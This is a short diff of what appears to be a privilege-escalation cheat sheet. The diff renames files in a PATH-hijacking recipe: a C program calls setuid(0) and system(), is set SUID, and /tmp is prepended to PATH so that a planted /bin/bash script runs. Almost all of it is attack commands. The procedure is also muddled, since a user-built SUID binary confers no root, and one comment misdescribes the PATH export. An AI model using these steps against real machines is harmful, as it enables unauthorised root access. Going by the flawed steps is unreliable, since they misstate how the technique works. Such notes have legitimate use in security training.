@@ -73,15 +73,15 @@ Use **echo $PATH**
 void main()
 { setuid(0);
   setgid(0);
-  system("exploit");
+  system("path");
 }
 ```
 * gcc exploit.c -o path -w *Complies code*
 * chmod u+s path *Changes file permissions*
 * export PATH=/tmp:$PATH *Creates a file in $PATH*
-* echo "/bin/bash" > /tmp/exploit
-* chmod 777 /tmp/exploit
-* ./exploit
+* echo "/bin/bash" > /tmp/path
+* chmod 777 /tmp/path
+* ./path
  
 
 
